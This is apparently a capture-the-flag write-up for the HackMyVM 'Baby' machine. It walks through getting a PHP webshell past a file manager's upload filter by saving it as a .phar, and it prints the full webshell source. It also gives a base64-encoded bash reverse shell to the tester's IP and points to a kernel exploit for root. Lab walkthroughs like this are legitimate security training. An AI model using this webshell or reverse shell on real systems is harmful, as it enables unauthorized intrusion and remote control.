# Baby - HackMyVM

Difficulty: Easy


## Enumeration

- Port 80: Runs an apache webserver
- Port 22: SSH (nothing interesting)


## Port 80

- It is running a simple file manager `simple php filemanager by jcampbell1`.
- The code to this file manager can be found [here](https://gitcode.com/gh_mirrors/sim/simple-file-manager/blob/master/index.php).
- Here we can see that by default `.php` files are not allowed to be uploaded. So we'll upload a `.phar` file instead.

- Simple PHP Webshell:

```php
<?php
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mini WebShell</title>
</head>
<body>
    <h2>PHP WebShell</h2>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($output)): ?>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
</html>
```

- I saved this as `webshell.phar` and uploaded it. Navigating to the uploaded file in the website gives us a working webshell.

## Initial Access

- Use this reverse shell payload to get a shell:

```bash
echo <your_base64_encoded_bash_payload> | base64 -d | bash
```

Example:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTEwLzQ0NDQgMD4mMQ== | base64 -d | bash
```

## Privilege Escalation

> NOTE: This might not be the official way to solve the box. Throughout my enumeration I failed to find any meaningful way to pivot to any of the `/home` users so I used the kernel exploit detected by linpeas.sh instead.

- Run [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) to check for enumeration.
- It shows that the box is vulnerable to the [copy fail](https://copy.fail/) exploit.
- The exploit given in the [copy fail](https://copy.fail/) website is not usable, since the box contains `python 3.9`.
- Instead we'll use [this exploit](https://github.com/Juguitos/copy-fail/tree/main).
- With the obtained root access, submit the user and root flag.


Happy Hacking :)
